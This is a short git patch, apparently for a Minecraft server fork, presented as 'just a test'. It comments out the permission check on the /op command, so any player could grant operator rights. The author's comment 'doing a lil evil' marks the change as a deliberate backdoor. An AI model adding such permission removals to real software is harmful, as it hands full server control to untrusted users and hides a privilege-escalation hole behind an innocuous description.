@@ -1,0 +1,20 @@
+From 0000000000000000000000000000000000000000 Mon Sep 17 00:00:00 2001
+From: PilkeySEK <PilkeySEK@gmx.de>
+Date: Mon, 29 Jul 2024 15:11:39 +0200
+Subject: [PATCH] just a test
+
+
+diff --git a/src/main/java/net/minecraft/server/commands/OpCommand.java b/src/main/java/net/minecraft/server/commands/OpCommand.java
+index e7b444a10b244828827b3c66c53465206ea8e0ec..f18525bb466633b77f4da73385e75959324f7b9e 100644
+--- a/src/main/java/net/minecraft/server/commands/OpCommand.java
++++ b/src/main/java/net/minecraft/server/commands/OpCommand.java
+@@ -18,7 +18,8 @@ public class OpCommand {
+     public static void register(CommandDispatcher<CommandSourceStack> dispatcher) {
+         dispatcher.register(
+             Commands.literal("op")
+-                .requires(source -> source.hasPermission(3))
++                // doing a lil evil >:}
++                // .requires(source -> source.hasPermission(3))
+                 .then(
+                     Commands.argument("targets", GameProfileArgument.gameProfile())
+                         .suggests(
